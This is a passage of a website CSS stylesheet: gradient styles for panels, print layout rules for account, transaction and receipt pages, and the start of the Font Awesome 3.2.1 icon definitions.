    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#428bca), color-stop(100%,#357ebd));
    background: -webkit-linear-gradient(top, #428bca 0%,#357ebd 100%);
    background: -o-linear-gradient(top, #428bca 0%,#357ebd 100%);
    background: -ms-linear-gradient(top, #428bca 0%,#357ebd 100%);
    background: linear-gradient(to bottom, #428bca 0%,#357ebd 100%);
}

.panel-success > .panel-heading {
    background: #dff0d8;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2RmZjBkOCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNkMGU5YzYiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #dff0d8 0%, #d0e9c6 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#dff0d8), color-stop(100%,#d0e9c6));
    background: -webkit-linear-gradient(top, #dff0d8 0%,#d0e9c6 100%);
    background: -o-linear-gradient(top, #dff0d8 0%,#d0e9c6 100%);
    background: -ms-linear-gradient(top, #dff0d8 0%,#d0e9c6 100%);
    background: linear-gradient(to bottom, #dff0d8 0%,#d0e9c6 100%);
}

.panel-info > .panel-heading {
    background: #d9edf7;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2Q5ZWRmNyIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNjNGUzZjMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #d9edf7 0%, #c4e3f3 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#d9edf7), color-stop(100%,#c4e3f3));
    background: -webkit-linear-gradient(top, #d9edf7 0%,#c4e3f3 100%);
    background: -o-linear-gradient(top, #d9edf7 0%,#c4e3f3 100%);
    background: -ms-linear-gradient(top, #d9edf7 0%,#c4e3f3 100%);
    background: linear-gradient(to bottom, #d9edf7 0%,#c4e3f3 100%);
}

.panel-warning > .panel-heading {
    background: #fcf8e3;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZjZjhlMyIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmYWYyY2MiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #fcf8e3 0%, #faf2cc 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fcf8e3), color-stop(100%,#faf2cc));
    background: -webkit-linear-gradient(top, #fcf8e3 0%,#faf2cc 100%);
    background: -o-linear-gradient(top, #fcf8e3 0%,#faf2cc 100%);
    background: -ms-linear-gradient(top, #fcf8e3 0%,#faf2cc 100%);
    background: linear-gradient(to bottom, #fcf8e3 0%,#faf2cc 100%);
}

.panel-danger > .panel-heading {
    background: #f2dede;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2YyZGVkZSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlYmNjY2MiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #f2dede 0%, #ebcccc 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#f2dede), color-stop(100%,#ebcccc));
    background: -webkit-linear-gradient(top, #f2dede 0%,#ebcccc 100%);
    background: -o-linear-gradient(top, #f2dede 0%,#ebcccc 100%);
    background: -ms-linear-gradient(top, #f2dede 0%,#ebcccc 100%);
    background: linear-gradient(to bottom, #f2dede 0%,#ebcccc 100%);
}

.well {
    -webkit-box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 0 rgba(255, 255, 255, 0.1);
    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05), 0 1px 0 rgba(255, 255, 255, 0.1);
    background: #e8e8e8;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2U4ZThlOCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNmNWY1ZjUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #e8e8e8 0%, #f5f5f5 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#e8e8e8), color-stop(100%,#f5f5f5));
    background: -webkit-linear-gradient(top, #e8e8e8 0%,#f5f5f5 100%);
    background: -o-linear-gradient(top, #e8e8e8 0%,#f5f5f5 100%);
    background: -ms-linear-gradient(top, #e8e8e8 0%,#f5f5f5 100%);
    background: linear-gradient(to bottom, #e8e8e8 0%,#f5f5f5 100%);
}

	
	
	
#navcontainer ul
{
margin: 0;
padding: 0;
list-style-type: none;
text-align: right;
}

#navcontainer ul li { display: inline; }

#navcontainer ul li a
{
text-decoration: none;
padding: .2em 1em;
color: #2a5db0;
}

.RUIFW-brand-alt {top: 0}

.form-control-signon {width: 29%;}

.form-control-reset {width: 61%;}

.signOn-pswd-instructions 
{
list-style-type: none;
margin: 0px -80px;
}

.reset-password-intructions 
{
margin: 0px -40px;	
}

.btn-holder-signon 
{
text-align: left;
}


@media print {
    #printHeader, #printFooter{display: block!important;}
    a{ color: #2a5db0 !important; }
    header{display: none!important;}
    footer{display: none!important;}
    .item-description{display: none!important;}
    #headerData{ margin-bottom:-10px;}
    #headerData label{ display:inline-block;}
    .noprint,#printHeader.noprint, #printFooter.noprint {display: none!important;}
    .navleft, .inline-nav, .quick-menu, .toggle-btn {display: none!important;}
    .actions{display: none!important;}
    .homebottomtable table tr th{ border:1px solid #d8d8d8!important;}
    .quick-menu-box{display: none!important; position: relative; overflow: visible !important; float: none !important; height:0px!important;}
    .RUIFW-container-header{display: none!important; position: relative; overflow: visible !important; float: none !important;}
    .print {display: block!important;}
    .progress{display: block!important;min-height:14px!important;overflow:visible!important;width:100%!important; clear:both; vertical-align:top; float:none;background-repeat: repeat-x;border-radius: 0px;border: 1px solid #D7D7D7!important;background-color: #d5d5d5!important;}
    .progress-bar-success { clear:both; vertical-align:top; float:none;display: block!important; overflow:hidden!important;  background-color: #00bb04!important;background-repeat:repeat-x;min-height:12px}
    .progress-bar-success:before{content:url(../images/print-progress-success.gif) ;}
    .progress-bar-danger{clear:both; vertical-align:top; float:none;display: block!important; background-color: #d81e05!important; min-height:12px;background-repeat:repeat-x; overflow:hidden!important; }
    .progress-bar-danger:before{content:url(../images/print-progress-danger.gif) ;}
    
    .overview-container{min-height:115px!important;width: 100%!important; clear:both; vertical-align:top; float:none;display: block!important; overflow:visible!important; border:none; padding-bottom:20px!important;}
    .overview-sect1{display: block!important; overflow:visible!important;padding-left:5px;}
    .overview-sect1 div.row{border-right: 1px solid #D7D7D7!important;}
    .overview-sect2{display: block!important; overflow:visible!important;}
    .RUIFW-content-main{display:block!important;width:100%!important;padding:0 0 200px 0!important; }
    .account-balance-container{display:block!important;width:100%!important;}
    .account-balance-container .RUIFW-hide.fade{max-height: 100%!important;min-height: 100%!important; display:block!important; clear:both; vertical-align:top; float:none;display: block!important; overflow:visible!important; }
    .accountDataset {border-top:1px solid #d8d8d8!important; }
    .accountDataset:before{margin-top:10px!important;}
    .tab-content-border{display:block!important;width:100%!important; margin-top:-2px!important;}
    .sub-header-bg{ width:100%;}
    .sub-header-bg .RUIFW-form-el{ border:none!important;}
    #myTab li.active{ border-bottom:2px solid #ffffff!important;}
    html, body{ border-bottom:none!important; background:none!important; padding: 0;position:relative; overflow:visible!important; float:none !important; font-family: Arial,sans-serif; }
    section{ border:none!important;}
    .RUIFW-page-wrap{ background:none!important;display: block!important;}
    .RUIFW-page-wrap:after{border:none!important; height:0px;}
    .hr-separator{display: block!important; overflow:visible!important;border-bottom: 1px solid #D7D7D7!important;height: 1px!important;width: 100%!important;margin-bottom: 15px!important;}
    a[href]:after { content: none !important;}
    .red-text {color: #d81e05!important;}
    h1{ padding-left:0px!important;margin-left:-5px;}
    .exp-collapse a.print_Open:before { content: "\f0d7"!important; margin-bottom:0px!important;padding-bottom:0px!important;}
    @page { /*margin-top: 0; margin-bottom:0;*/ size:auto;  /* auto is the current printer page size */}
    
    .fade.in.RUIFW-print-view{max-height:0px!important; overflow:hidden; z-index:0;}
    
    #transactionDetails .accnt-act-details1 {border: 1px solid #D7D7D7!important; margin-top:20px;}
    #transactionDetails .accnt-act-details1 p { margin: 0; vertical-align: text-top;border-bottom: 1px solid #D7D7D7!important; }
    #transactionDetails .accnt-act-details1 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: break-all; width: 65%; vertical-align: text-top;padding:5px!important;border-left: 1px solid #D7D7D7!important;  }
    #transactionDetails .accnt-act-details1 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; margin-bottom:0px;  width: 35%;padding:5px!important; border-right: 1px solid #D7D7D7!important;}
    
    
    .modal-open{  overflow:hidden!important;}
    .fade.modal{overflow:hidden!important; display:none;}
    .modal.RUIFW-print-view{display:block!important; position:absolute!important; top:40px!important; overflow:visible!important;}
    .modalPrint #printFooter{ margin-top:70%;}
    
    .modalPrint .modal-header{ text-align:center!important; padding:0!important;}
    .modalPrint .modal-header h4{text-align:center!important;}
    .modalPrint .modal-body{padding: 10px 0 15px 0!important;}
    .modalPrint .modal-dialog {width:98%!important; padding-top:10px!important;}
    
    .RUIFW-content-main{margin-bottom:-200px!important; }
    
    
    
    .modalPrint .accnt-act-details1 p { margin: 0; vertical-align: text-top; }
    .modalPrint .accnt-act-details1 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: break-all; width: 64.4%;  vertical-align: text-top; }
    .modalPrint .accnt-act-details1 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; margin-bottom:0px;}
    
    .datepicker table tr td.activeEvent:before , .datepicker table tr td.activeEvent.disabled:before { content: "\f111" !important; color: #d81e05; font-family: fontAwesome; font-size: 15px; margin-right:5px;   }
    
    
    /* Recipts Styles */
    #recieptBlock {font-size: 1.5em;  font-family: Arial,sans-serif; margin-top: -20px; }
    .add-txt{width:100%; float:left; font-size:0.795em;line-height: 21px;}
    .hr-separator { width: 100%; border-bottom: 1px solid #535353; height: 1px; margin:10px 0px 10px 0px; }
    .clear{clear:both;}
    .rece-txt{color: #535353; font-size:0.77em; text-align:justify; line-height: 20px; hyphens: auto;}
    .rece-txt2{color: #535353; font-size:0.77em; text-align:left; font-weight:bold;line-height: 20px;}
    .com-txt2{color: #6F6E6E; font-size:0.89em; text-align:left;line-height: 20px;}
    .t_footer{font-size:0.78em;padding:50px 0px 0px 0px; color:#F00;}
    .add_div{float:left; width:600x;}
    .logo_div{float:right; width:200px;}
    .add_txt{font-size:1em; line-height:27px;}
    .add_txt2{font-size:0.82em; line-height: 20px;}
    .padding5{padding:0 0 5px 0;}
    .right-float{float:right; width:228px; text-align:right;}
    .right-float-can{float:right; width:297px; text-align:right;}
    .left-float {float:left; width:auto; text-align:left; margin-top:21px;}
    .mrgn-top-10{margin-top:10px;}
    .padding_table td{padding: 2px 5px 2px 5px;}
    ul.star-shaped-bullet li:before {content: "\2217"}
    ul.star-shaped-bullet { margin: 0; list-style: none; text-align: left; margin-left: -40px; }
    .margin-left{margin-left: -22px;}
    .fontsize{font-size: 1em;}
    
    
    .RUIFW-container-main  {overflow:hidden;  }
    
    #content_block .btn.btn-default, #content_block .check, #content_block .btn-holder {display:none}
    .tandcHolder{height:100%;overflow:visible}
    /* CSS for Leap Phase 2 Applications*/
    .termsandconditionsWrap{height: 100%; overflow:visible;}
    .printTermsFooterDisplay {display:block !important}
    #RUIFW-print-terms-modal .modal-dialog {margin-top:30px !important; float:left;width:100%;}
    #RUIFW-print-terms-modal .width100{width:100%;}
    .modal .RUIFW-print-view .modal-body .termsandconditionsWrap{display: block !important; height: 100% !important;}
    .print-button-wrap{display:none;}
    .download-print-button {display:none !important;}
    #RUIFW-print-terms-modal .modal-open{  overflow:visible!important;}
    #confirmView .mrgn-left-0{margin-left:0px}
    #confirmView .RUIFW-content-main{margin-bottom:0 !important; padding-bottom:0px !important;}
    .mainWrap{margin-bottom:0px;}
    #campaignForm .modal, #RUIFW-print-terms-modal{margin-top:0;}
    /* Firefox CSS print CSS */
    
    @-moz-document url-prefix() {
        
    .RUIFW-content-main{display:block!important;width:680px!important;padding:0px!important;margin-top:-40px !important;}
    h1{ padding-left:0px!important;position:relative; overflow:visible !important; float: none !important;min-height:55px; margin-left:-5px;margin-top:-700px !important;}
    .account-balance-container{display:block!important;width:680px!important;}
    .tab-content-border{display:block!important;width:680px!important; margin-top:-2px!important;}
    .modal.RUIFW-print-view{top:40px!important;}
    #printFooter{margin-top:200px !important;}
    .modalPrint #printFooter{ margin-top:70%  !important;}
    .RUIFW-container-main {  overflow:visible; }
    #RUIFW-print-terms-modal .modal-dialog{page-break-after:avoid;width:100%; float:left;}
    #confirmView h1{page-break-before:always !important; margin-top:-120% !important;}
    .leftWrapper{margin-top:0;position:relative; left:2px;}
    }
    
    
    }
    
	
	
 @font-face {
    font-family: 'FontAwesome';
    src: url('../font/fontawesome-webfont.eot?v=3.2.1');
    src: url('../font/fontawesome-webfont.eot?#iefix&v=3.2.1') format('embedded-opentype'), 
    url('../font/fontawesome-webfont.woff?v=3.2.1') format('woff'), 
    url('../font/fontawesome-webfont.ttf?v=3.2.1') format('truetype'), 
    url('../font/fontawesome-webfont.svg#fontawesomeregular?v=3.2.1') format('svg');
    font-weight: normal;
    font-style: normal;
  }
  /* FONT AWESOME CORE
   * -------------------------- */
  [class^="icon-"],
  [class*=" icon-"] {
    font-family: FontAwesome;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    -webkit-font-smoothing: antialiased;
    *margin-right: .3em;
  }
  [class^="icon-"]:before,
  [class*=" icon-"]:before {
    text-decoration: inherit;
    display: inline-block;
    speak: none;
  }
  /* makes the font 33% larger relative to the icon container */
  .icon-large:before {
    vertical-align: -10%;
    font-size: 1.3333333333333333em;
  }
  /* makes sure icons active on rollover in links */
  a [class^="icon-"],
  a [class*=" icon-"] {
    display: inline;
  }
  /* increased font size for icon-large */
  [class^="icon-"].icon-fixed-width,
  [class*=" icon-"].icon-fixed-width {
    display: inline-block;
    width: 1.1428571428571428em;
    text-align: right;
    padding-right: 0.2857142857142857em;
  }
  [class^="icon-"].icon-fixed-width.icon-large,
  [class*=" icon-"].icon-fixed-width.icon-large {
    width: 1.4285714285714286em;
  }
  .icons-ul {
    margin-left: 2.142857142857143em;
    list-style-type: none;
  }
  .icons-ul > li {
    position: relative;
  }
  .icons-ul .icon-li {
    position: absolute;
    left: -2.142857142857143em;
    width: 2.142857142857143em;
    text-align: center;
    line-height: inherit;
  }
  [class^="icon-"].hide,
  [class*=" icon-"].hide {
    display: none;
  }
  .icon-muted {
    color: #eeeeee;
  }
  .icon-light {
    color: #ffffff;
  }
  .icon-dark {
    color: #333333;
  }
  .icon-border {
    border: solid 1px #eeeeee;
    padding: .2em .25em .15em;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
  }
  .icon-2x {
    font-size: 2em;
  }
  .icon-2x.icon-border {
    border-width: 2px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
  }
  .icon-3x {
    font-size: 3em;
  }
  .icon-3x.icon-border {
    border-width: 3px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
  }
  .icon-4x {
    font-size: 4em;
  }
  .icon-4x.icon-border {
    border-width: 4px;
    -webkit-border-radius: 6px;
    -moz-border-radius: 6px;
    border-radius: 6px;
  }
  .icon-5x {
    font-size: 5em;
  }
  .icon-5x.icon-border {
    border-width: 5px;
    -webkit-border-radius: 7px;
    -moz-border-radius: 7px;
    border-radius: 7px;
  }
  .pull-right {
    float: right;
  }
  .pull-left {
    float: left;
  }
  [class^="icon-"].pull-left,
  [class*=" icon-"].pull-left {
    margin-right: .3em;
  }
  [class^="icon-"].pull-right,
  [class*=" icon-"].pull-right {
    margin-left: .3em;
  }
  /* BOOTSTRAP SPECIFIC CLASSES
   * -------------------------- */
  /* Bootstrap 2.0 sprites.less reset */
  [class^="icon-"],
  [class*=" icon-"] {
    display: inline;
    width: auto;
    height: auto;
    line-height: normal;
    vertical-align: baseline;
    background-image: none;
    background-position: 0% 0%;
    background-repeat: repeat;
    margin-top: 0;
  }
  /* more sprites.less reset */
  .icon-white,
  .nav-pills > .active > a > [class^="icon-"],
  .nav-pills > .active > a > [class*=" icon-"],
  .nav-list > .active > a > [class^="icon-"],
  .nav-list > .active > a > [class*=" icon-"],
  .navbar-inverse .nav > .active > a > [class^="icon-"],
  .navbar-inverse .nav > .active > a > [class*=" icon-"],
  .dropdown-menu > li > a:hover > [class^="icon-"],
  .dropdown-menu > li > a:hover > [class*=" icon-"],
  .dropdown-menu > .active > a > [class^="icon-"],
  .dropdown-menu > .active > a > [class*=" icon-"],
  .dropdown-submenu:hover > a > [class^="icon-"],
  .dropdown-submenu:hover > a > [class*=" icon-"] {
    background-image: none;
  }
  /* keeps Bootstrap styles with and without icons the same */
  .btn [class^="icon-"].icon-large,
  .nav [class^="icon-"].icon-large,
  .btn [class*=" icon-"].icon-large,
  .nav [class*=" icon-"].icon-large {
    line-height: .9em;
  }
  .btn [class^="icon-"].icon-spin,
  .nav [class^="icon-"].icon-spin,
  .btn [class*=" icon-"].icon-spin,
  .nav [class*=" icon-"].icon-spin {
    display: inline-block;
  }
  .nav-tabs [class^="icon-"],
  .nav-pills [class^="icon-"],
  .nav-tabs [class*=" icon-"],
  .nav-pills [class*=" icon-"],
  .nav-tabs [class^="icon-"].icon-large,
  .nav-pills [class^="icon-"].icon-large,
  .nav-tabs [class*=" icon-"].icon-large,
  .nav-pills [class*=" icon-"].icon-large {
    line-height: .9em;
  }
  .btn [class^="icon-"].pull-left.icon-2x,
  .btn [class*=" icon-"].pull-left.icon-2x,
  .btn [class^="icon-"].pull-right.icon-2x,
  .btn [class*=" icon-"].pull-right.icon-2x {
    margin-top: .18em;
  }
  .btn [class^="icon-"].icon-spin.icon-large,
  .btn [class*=" icon-"].icon-spin.icon-large {
    line-height: .8em;
  }
  .btn.btn-small [class^="icon-"].pull-left.icon-2x,
  .btn.btn-small [class*=" icon-"].pull-left.icon-2x,
  .btn.btn-small [class^="icon-"].pull-right.icon-2x,
  .btn.btn-small [class*=" icon-"].pull-right.icon-2x {
    margin-top: .25em;
  }
  .btn.btn-large [class^="icon-"],
  .btn.btn-large [class*=" icon-"] {
    margin-top: 0;
  }
  .btn.btn-large [class^="icon-"].pull-left.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-left.icon-2x,
  .btn.btn-large [class^="icon-"].pull-right.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-right.icon-2x {
    margin-top: .05em;
  }
  .btn.btn-large [class^="icon-"].pull-left.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-left.icon-2x {
    margin-right: .2em;
  }
  .btn.btn-large [class^="icon-"].pull-right.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-right.icon-2x {
    margin-left: .2em;
  }
  /* Fixes alignment in nav lists */
  .nav-list [class^="icon-"],
  .nav-list [class*=" icon-"] {
    line-height: inherit;
  }
  /* EXTRAS
   * -------------------------- */
  /* Stacked and layered icon */
  .icon-stack {
    position: relative;
    display: inline-block;
    width: 2em;
    height: 2em;
    line-height: 2em;
    vertical-align: -35%;
  }
  .icon-stack [class^="icon-"],
  .icon-stack [class*=" icon-"] {
    display: block;
    text-align: center;
    position: absolute;
    width: 100%;
    height: 100%;
    font-size: 1em;
    line-height: inherit;
    *line-height: 2em;
  }
  .icon-stack .icon-stack-base {
    font-size: 2em;
    *line-height: 1em;
  }
  /* Animated rotating icon */
  .icon-spin {
    display: inline-block;
    -moz-animation: spin 2s infinite linear;
    -o-animation: spin 2s infinite linear;
    -webkit-animation: spin 2s infinite linear;
    animation: spin 2s infinite linear;
  }
  /* Prevent stack and spinners from being taken inline when inside a link */
  a .icon-stack,
  a .icon-spin {
    display: inline-block;
    text-decoration: none;
  }
  @-moz-keyframes spin {
    0% {
      -moz-transform: rotate(0deg);
    }
    100% {
      -moz-transform: rotate(359deg);
    }
  }
  @-webkit-keyframes spin {
    0% {
      -webkit-transform: rotate(0deg);
    }
    100% {
      -webkit-transform: rotate(359deg);
    }
  }
  @-o-keyframes spin {
    0% {
      -o-transform: rotate(0deg);
    }
    100% {
      -o-transform: rotate(359deg);
    }
  }
  @-ms-keyframes spin {
    0% {
      -ms-transform: rotate(0deg);
    }
    100% {
      -ms-transform: rotate(359deg);
    }
  }
  @keyframes spin {
    0% {
      transform: rotate(0deg);
    }
    100% {
      transform: rotate(359deg);
    }
  }
  /* Icon rotations and mirroring */
  .icon-rotate-90:before {
    -webkit-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    transform: rotate(90deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=1);
  }
  .icon-rotate-180:before {
    -webkit-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    transform: rotate(180deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=2);
  }
  .icon-rotate-270:before {
    -webkit-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    transform: rotate(270deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=3);
  }
  .icon-flip-horizontal:before {
    -webkit-transform: scale(-1, 1);
    -moz-transform: scale(-1, 1);
    -ms-transform: scale(-1, 1);
    -o-transform: scale(-1, 1);
    transform: scale(-1, 1);
  }
  .icon-flip-vertical:before {
    -webkit-transform: scale(1, -1);
    -moz-transform: scale(1, -1);
    -ms-transform: scale(1, -1);
    -o-transform: scale(1, -1);
    transform: scale(1, -1);
  }
  /* ensure rotation occurs inside anchor tags */
  a .icon-rotate-90:before,
  a .icon-rotate-180:before,
  a .icon-rotate-270:before,
  a .icon-flip-horizontal:before,
  a .icon-flip-vertical:before {
    display: inline-block;
  }
  /* Font Awesome uses the Unicode Private Use Area (PUA) to ensure screen
     readers do not read off random characters that represent icons */
  .icon-glass:before {
    content: "\f000";
  }
  .icon-music:before {
    content: "\f001";
  }
  .icon-search:before {
    content: "\f002";
  }
  .icon-envelope-alt:before {
    content: "\f003";
  }
  .icon-heart:before {
    content: "\f004";
  }
  .icon-star:before {
    content: "\f005";
  }
  .icon-star-empty:before {
    content: "\f006";
  }
  .icon-user:before {
    content: "\f007";
  }
  .icon-film:before {
    content: "\f008";
  }
  .icon-th-large:before {
    content: "\f009";
  }
  .icon-th:before {
    content: "\f00a";
  }
  .icon-th-list:before {
    content: "\f00b";
  }
  .icon-ok:before {
    content: "\f00c";
  }
  .icon-remove:before {
    content: "\f00d";
  }
  .icon-zoom-in:before {
    content: "\f00e";
  }
  .icon-zoom-out:before {
    content: "\f010";
  }
  .icon-power-off:before,
  .icon-off:before {
    content: "\f011";
  }
  .icon-signal:before {
    content: "\f012";
  }
  .icon-gear:before,
  .icon-cog:before {
    content: "\f013";
  }
  .icon-trash:before {
    content: "\f014";
  }
  .icon-home:before {
    content: "\f015";
  }
  .icon-file-alt:before {
    content: "\f016";
  }
  .icon-time:before {
    content: "\f017";
  }
  .icon-road:before {
    content: "\f018";
  }
  .icon-download-alt:before {
    content: "\f019";
  }
  .icon-download:before {
    content: "\f01a";
  }
  .icon-upload:before {
    content: "\f01b";
  }
  .icon-inbox:before {
    content: "\f01c";
  }
  .icon-play-circle:before {
    content: "\f01d";
  }
  .icon-rotate-right:before,
  .icon-repeat:before {
    content: "\f01e";
  }
  .icon-refresh:before {
    content: "\f021";
  }
  .icon-list-alt:before {
    content: "\f022";
  }
  .icon-lock:before {
    content: "\f023";
  }
  .icon-flag:before {
    content: "\f024";
  }
  .icon-headphones:before {
    content: "\f025";
  }
  .icon-volume-off:before {
    content: "\f026";
  }
  .icon-volume-down:before {
    content: "\f027";
  }
  .icon-volume-up:before {
    content: "\f028";
  }
  .icon-qrcode:before {
    content: "\f029";
  }
  .icon-barcode:before {
    content: "\f02a";
  }
  .icon-tag:before {
    content: "\f02b";
  }
  .icon-tags:before {
    content: "\f02c";
  }
  .icon-book:before {
    content: "\f02d";
  }
  .icon-bookmark:before {
    content: "\f02e";
  }
  .icon-print:before {
    content: "\f02f";
  }
  .icon-camera:before {
    content: "\f030";
  }
  .icon-font:before {
    content: "\f031";
  }
  .icon-bold:before {
    content: "\f032";
  }
  .icon-italic:before {
    content: "\f033";
  }
